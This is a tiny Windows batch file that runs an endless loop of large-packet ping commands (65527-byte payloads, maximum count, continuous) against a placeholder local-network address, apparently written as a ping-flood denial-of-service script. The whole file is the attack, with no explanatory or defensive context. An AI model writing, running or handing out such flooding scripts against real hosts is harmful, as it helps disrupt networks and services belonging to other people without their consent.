@ECHO OFF
:loop
ping -t -n 4294967295 -l 65527 192.168.X.X
goto loop: